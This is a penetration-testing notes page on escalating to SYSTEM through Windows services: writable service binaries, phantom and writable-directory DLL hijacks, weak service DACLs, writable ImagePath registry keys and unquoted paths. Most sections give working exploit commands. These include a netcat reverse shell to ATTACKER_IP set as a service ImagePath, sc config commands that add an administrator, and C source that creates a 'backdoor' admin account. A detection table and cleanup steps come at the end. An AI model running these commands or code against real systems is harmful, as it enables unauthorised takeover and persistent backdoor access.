+++
title = 'Services Hijacking'
date = 2026-10-30
type = 'notes'
weight = 50
toc = true
tags = ['windows', 'privilege-escalation', 'services', 'path-hijack']
+++

Windows services are the highest-yield privilege escalation surface on the platform because they run as `LocalSystem` while referencing **four separate objects** that a low-privileged user may be able to influence:

| Attack surface | You control | Exploitation | Primary check |
|---|---|---|---|
| **Service binary** | The `.exe` on disk | Replace the file, restart the service | `icacls` on the binary |
| **Loaded DLL** | A DLL path the service searches | Plant a DLL with the expected name | Procmon `NAME NOT FOUND` |
| **Service DACL** | The service object | `sc config binPath=`, restart | `accesschk -uwcqv` |
| **Service registry key** | `ImagePath` / `ServiceDll` | Edit the value, restart | `accesschk -kvuqsw` |

> **Key distinction:** A writable binary is a **file-system** problem. A modifiable service DACL is a **service-object** problem — you do not need write access to the binary's directory. A writable registry key is a **third, separate** problem. Enumerate all four.

---

## 1. Service Binary Hijacking — Manual

Each Windows service has an associated binary executed when the service starts. A lower-privileged user who can **replace that binary** inherits the service account's privileges — usually `LocalSystem`.

### 1.1 Enumerate running services and their binaries

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName |
  Where-Object {$_.State -like 'Running'}
```

Or via `sc`:

```cmd
sc query state= all | findstr /i "SERVICE_NAME"
```

### 1.2 Check the binary ACL

```cmd
icacls "C:\xampp\apache\bin\httpd.exe"
```

You want **`(F)` Full Access**, **`(M)` Modify**, or **`(W)` Write** on a principal you belong to (`Users`, `Authenticated Users`, `Everyone`, or your username). **`(I)` alone only means the entry was inherited** — it is not a permission level.

### 1.3 Replace and restart

```cmd
:: Back up first
copy "C:\xampp\apache\bin\httpd.exe" C:\Temp\httpd.exe.bak

:: Replace
copy /Y C:\Temp\payload.exe "C:\xampp\apache\bin\httpd.exe"

:: Restart
net stop apache2.4 & net start apache2.4
```

### 1.4 Check the start mode

If `net stop` / `net start` fails, check whether the service is `Auto`:

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode |
  Where-Object {$_.Name -like 'mysql'}
```

If it is `Auto` and cannot be restarted, a reboot triggers it:

```cmd
shutdown /r /t 0
```

> **Expected error after `net start`.** The start command launches your hijacked binary, not the original service code, so the service effectively **fails to start** and prints an error — **even when exploitation succeeded**. Verify by checking the effect of your payload (e.g. `net localgroup administrators`), not the service state.

### 1.5 Recent CVEs — insecure service binary permissions

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2026-0539** | pcvisit Remote Host Modul (22.6.22.1329 – 25.12.3.1745) | Incorrect default permissions in the service binary allow a low-privileged local attacker to **overwrite the binary**; launched as `NT\SYSTEM` on boot  |
| **CVE-2025-66266** | UPSilon 2000 (`RupsMon.exe`) | **`Everyone` group has Full Control** over the service executable — replace the binary **or** change the config path, then start/stop for SYSTEM code execution  |
| **CVE-2025-66264** | ClientMate (`CMService.exe`) | Service runs as SYSTEM with insecure binary permissions — replace and restart  |

---

## 2. DLL Hijacking — The Often-Missed Binary-Adjacent Path

The service binary may be perfectly protected while a **directory it loads DLLs from is writable**, or while the service references a **DLL that does not exist** at all.

### 2.1 Phantom / missing-DLL hijack

A **phantom DLL** is a library the service references but which is **not present** anywhere in its search order. Windows walks the DLL search path looking for it; if any directory in that search order is writable, a low-privileged user can plant the DLL and the SYSTEM service loads it .

**Canonical example — StorSvc (`SprintCSP.dll`):** `StorSvc` runs as SYSTEM and, on unpatched builds, tries to load `SprintCSP.dll`, which does not exist in a searched path. If any directory in that search order is writable (a mis-added `C:\` PATH entry, a writable app directory), planting `SprintCSP.dll` yields SYSTEM .

**Detection with Procmon** — filter on the service's `svchost` process, path ending in the missing DLL name, result `NAME NOT FOUND`; then check whether any searched directory is writable .

```powershell
$env:PATH -split ';' | Where-Object {
  $_ -and (Test-Path $_) -and
  ( (Get-Acl $_).Access | Where-Object {
      $_.FileSystemRights -match 'Write|Modify|FullControl' -and
      $_.IdentityReference -match 'Users|Authenticated'
  })
} | ForEach-Object { "WRITABLE: $_" }
```

**Exploitation:** build a `SprintCSP.dll` whose `DllMain` runs your payload, drop it in the writable search-path directory, and trigger the service (public PoCs supply both the trigger and a template DLL) .

### 2.2 Writable-directory DLL hijack

The service installs into a **directory writable by non-administrative users** and loads a DLL from that directory. Real 2025 examples:

| CVE | Product | DLL / Path |
|---|---|---|
| **CVE-2025-61161** | Evope Collector 1.1.6.9.0 | `Evope.Service.exe` loads **`wtsapi32.dll`** from `C:\ProgramData\Evope` — an uncontrolled search path; SYSTEM on startup or reboot  |
| **CVE-2025-13051** | ABP / AES | Service installed in a directory **writable by non-admin users**; plant a DLL with the expected name → `LocalSystem` on restart  |

### 2.3 The `ShieldBreak` / `phoneinfo.dll` chain (2026)

A privileged write primitive plants **`C:\Windows\System32\phoneinfo.dll`**, then triggers **Windows Error Reporting** (`wermgr.exe`), which loads the planted library at **SYSTEM integrity** . Related campaigns include **RoguePlanet**. This is a phantom-DLL variant where the plant occurs in a **protected directory** — the enabler is a separate arbitrary-write primitive, not a writable folder.

> **Machine PATH is a separate surface.** A writable directory in the **system-wide** `PATH` is a **primitive**, not proof of code execution — the loader must actually reach the PATH stage for a DLL the service cannot find earlier. Confirm with Procmon before treating a writable PATH entry as exploitable.

---

## 3. Weak Service Permissions (`SERVICE_CHANGE_CONFIG`)

The **service object** has its own ACL, separate from the binary. If your user holds **`SERVICE_CHANGE_CONFIG`** or **`SERVICE_ALL_ACCESS`** on a SYSTEM service, you can repoint `binPath` without touching the binary's directory .

### 3.1 Enumerate

```cmd
accesschk.exe /accepteula -uwcqv "%USERNAME%" *
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
```

Exploitable rights:

| Right | Meaning |
|---|---|
| **`SERVICE_ALL_ACCESS`** | Full control over the service |
| **`SERVICE_CHANGE_CONFIG`** | Can modify the binary path |
| **`WRITE_DAC`** | Can rewrite the service ACL to grant yourself more access  |

Confirm the service runs as SYSTEM:

```cmd
sc qc VulnerableService
:: SERVICE_START_NAME : LocalSystem
```

### 3.2 Exploit — `sc config binPath=`

```cmd
sc config VulnerableService binPath= "cmd /c net localgroup administrators pwn /add"
sc stop VulnerableService
sc start VulnerableService
```

> **The space after `binPath=` is mandatory.** `binPath= "..."` — not `binPath="..."`. Without it, `sc` returns **error 87** (“The parameter is incorrect”).

**Error 1053 is expected** — `cmd.exe` is not a real service; the command still executes.

### 3.3 Edge cases

- **`SERVICE_CHANGE_CONFIG` without start/stop.** If `sc stop`/`sc start` is denied, use `sc config <svc> start= auto` and wait for a reboot, or find another service you *can* restart that shares the same binary.
- **Low-privileged service account.** Adding yourself to Administrators still works, but you may need to **log off and back on** for the group membership to appear in your token.
- **Restore the original path** afterwards to reduce IOCs.
- **`WRITE_DAC` alone is enough** — you can rewrite the service ACL to grant yourself `SERVICE_CHANGE_CONFIG`, then proceed.

---

## 4. Writable Service Registry Key (`ImagePath` / `ServiceDll`)

A **third, distinct** misconfiguration: the service's registry key under `HKLM\SYSTEM\CurrentControlSet\Services\<name>` is writable. You can edit `ImagePath` directly — equivalent to `binPath` but without requiring `SERVICE_CHANGE_CONFIG` .

### 4.1 Enumerate

```cmd
accesschk.exe /accepteula -kvuqsw hklm\System\CurrentControlSet\services
```

Look for **`KEY_ALL_ACCESS`** or **`KEY_WRITE`** on a SYSTEM service key.

### 4.2 Exploit — edit `ImagePath`

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService" `
  -Name "ImagePath" -Value "C:\Tools\nc.exe -e cmd.exe ATTACKER_IP 4444"

sc.exe stop ModelManagerService
sc.exe start ModelManagerService
```

> **`ImagePath` is the registry equivalent of `binPath`.** If the DACL blocks `sc config` but the registry key is writable, this is the path — and it generates **different detection signals** (registry write vs. `sc.exe` process creation).

For **svchost-hosted services**, the hijackable value is **`ServiceDll`** under `...\Services\<svc>\Parameters\` — a writable `ServiceDll` is the same primitive for a DLL instead of an EXE.

---

## 5. Unquoted Service Paths

When a service binary path contains **spaces and no quotation marks**, Windows tries each space-delimited prefix as an executable. If any intermediate directory is writable, you can drop a binary there and it runs as the service account .

For `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`:

```
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\System.exe          ← hijack here if writable
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

### 5.1 Prerequisites

- Service starts as **`LocalSystem`** (or another privileged account) and is **startable/restartable** — check `sc qc` and `sc query`.
- **Write access** to one of the interpreted directories — verify with `icacls`.
- The executable name must match **exactly** (`Program.exe`, `System.exe`, `service.exe`).
- A **reboot or service restart** is required. If you cannot restart, look for another writable path or a restart trigger.

### 5.2 Enumerate and exploit

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

Then walk the path with `icacls` until you find `(W)` or `(F)`:

```cmd
icacls C:\
icacls "C:\Program Files"
icacls "C:\Program Files (x86)"
```

Drop the payload with the **exact expected name**, then restart:

```cmd
copy /Y C:\Temp\payload.exe "C:\Program Files (x86)\System.exe"
sc stop VulnService & sc start VulnService
```

### 5.3 Recent CVEs — unquoted service path is not legacy

| CVE | Product | Notes |
|---|---|---|
| **CVE-2025-61865** | NarSuS App | Write on the system-drive root → SYSTEM  |
| **CVE-2025-66264** | ClientMate (`CMService.exe`) | SYSTEM service, unquoted path  |
| **CVE-2025-64151** | Roboticsware products | Multiple unquoted service paths  |
| **CVE-2025-59307** | Century RAID Manager | Classic unquoted service path  |
| **CVE-2025-8070** | ASUSTOR ABP / AES | Unquoted **`ImagePath`** registry value → `C:\Program.exe`  |
| **CVE-2025-66461** | GS Yuasa FULLBACK Manager Pro | Unquoted service path  |
| **CVE-2026-1585** | IJ Scan Utility 1.1.2 – 1.5.0 | Unquoted service executable path  |
| **CVE-2025-61871** | BUFFALO NAS Navigator2 | Service registered with an unquoted path  |

> **CVE-2025-8070** is worth noting specifically because the flaw is in the **`ImagePath` registry value**, not the service binary — it bridges Sections 4 and 5.

---

## 6. PowerUp Automation

```powershell
Import-Module .\PowerUp.ps1

# All checks
Invoke-AllChecks

# Services whose binary is modifiable
Get-ModifiableServiceFile

# Check a specific binary
echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal

# Unquoted service paths
Get-UnquotedService

# Abuse a specific service (default: creates local admin `john` / `Password123!`)
Invoke-ServiceAbuse -Name 'ServiceName'

# Write a custom binary to a service path
Write-ServiceBinary -Name 'ServiceName' -Path "C:\path\to\example.exe"
```

> **PowerUp separates binary and DACL findings** (`Get-ModifiableServiceFile` vs. `Get-ModifiableService`). Read both sections — do not stop at the first hit.

---

## 7. C Code — Replace a Service Binary

```c
#include <stdlib.h>

int main ()
{
  int i;

  i = system ("net user backdoor backdoor123 /add");
  i = system ("net localgroup administrators backdoor /add");

  return 0;
}

// Compile on the attacker host:
// x86_64-w64-mingw32-gcc adduser.c -o binaryfilename.exe
```

Transfer the compiled `.exe` to the target, back up the original service binary, replace it, and restart the service.

---

## 8. Detection — What Each Technique Exposes

If you are documenting a path or writing detection logic, note the signal each technique leaves:

| Technique | Primary telemetry |
|---|---|
| **`sc config binPath=`** | Sysmon 1 / 4688 — `sc.exe config ... binpath`; **Event 7045 does not fire** when an existing service is reconfigured  |
| **Registry `ImagePath` / `ServiceDll` edit** | Sysmon 13 / `reg.exe` command line; `sc.exe` may show `services.exe` as the writer  |
| **New service installed** | System 7045 / Security 4697 — alert on paths in `Temp`, `Users`, `ProgramData`, `cmd /c`, `powershell`, UNC  |
| **Service stop/start from non-admin** | System 7036 / EDR  |
| **Service binary replaced by non-admin** | Sysmon 11 / EDR file events — **earliest signal** of the binary-replacement path  |
| **Phantom DLL planted** | Sysmon 11 (FileCreate) in system directories; `svchost.exe` loading a DLL from a non-System32 path (Sysmon 7)  |

**Key detection gap:** `Event 7045` fires on **new** service installation, not on **reconfiguration** of an existing service. The reliable `sc config` signal is the **process creation** for `sc.exe` itself, with `config` and `binpath` in the command line .

### Cleanup

```cmd
:: Restore the binary
copy /Y C:\Temp\service.exe.bak "C:\Program Files\Vuln Service\service.exe"

:: Restore the service path
sc config VulnService binPath= "<original path>"

:: Remove a test admin account
net localgroup administrators pwn /delete
```

> **Restore the original binary and service configuration after testing.** A replaced SYSTEM binary or a modified `binPath` is both a stability risk and an obvious IOC.

---

## Quick Reference

| Technique | Enumerate | Exploit | Edge case |
|---|---|---|---|
| **Writable binary** | `icacls "C:\path\svc.exe"` | Replace → `net stop/start` | `(I)` is not a permission; error after `net start` is expected |
| **Phantom DLL** | Procmon `NAME NOT FOUND` on the service process | Plant DLL in writable search path → trigger | Writable PATH is a primitive, not proof |
| **Writable-dir DLL** | Check service install directories | Plant DLL with expected name → restart | CVE-2025-61161 / 13051 pattern |
| **Service DACL** | `accesschk -uwcqv %USERNAME% *` | `sc config svc binPath= "cmd /c ..."` | Mandatory space after `=`; error 87 without it |
| **Registry `ImagePath`** | `accesschk -kvuqsw hklm\...\services` | `Set-ItemProperty ... ImagePath` | Separate from `sc config`; different telemetry |
| **`ServiceDll` (svchost)** | `accesschk -kvuqsw` on `...\Parameters\` | Edit `ServiceDll` → restart | DLL equivalent of `ImagePath` |
| **Unquoted service path** | `wmic service get ...` or `Get-UnquotedService` | Drop `C:\Program.exe` / intermediate | Intermediate directory must be writable |

---

## Field Notes

- **Four surfaces, four checks.** Writable binary, writable DLL path, modifiable service DACL, writable registry key. A host that is clean on one is not necessarily clean on the others.
- **Phantom DLL is still reliable in 2026.** `StorSvc` / `SprintCSP.dll` is the canonical example, and the `phoneinfo.dll` / `ShieldBreak` chain shows the technique evolving into protected-directory plants enabled by a separate write primitive.
- **DLL hijacking CVEs are current.** CVE-2025-61161 (`wtsapi32.dll` from `C:\ProgramData\Evope`) and CVE-2025-13051 (writable install directory) are both SYSTEM-on-restart primitives.
- **`net start` error after replacement is normal.** The payload ran; the service just did not behave like a service.
- **`sc config` needs the space.** `binPath= "..."` — without it, **error 87**.
- **`ImagePath` is a separate path.** A writable registry key works even when `sc config` is denied — and it produces registry telemetry instead of `sc.exe` process creation.
- **Unquoted service paths are still being disclosed in 2025–2026.** CVE-2025-66264, CVE-2025-61865, CVE-2025-64151, CVE-2026-1585, and CVE-2025-8070 are all current examples.
- **Event 7045 is not a reconfiguration detector.** It fires on **new** service creation only. Alert on `sc.exe config ... binpath` process creation for the reconfiguration path.

---

This file sits alongside the **File System ACLs** and **Excessive User Rights Abuse** notes: a Backup Operator or Server Operator lands with these rights already present, and a writable service binary or phantom DLL is often the fastest SYSTEM path after `SeImpersonate` has been ruled out.
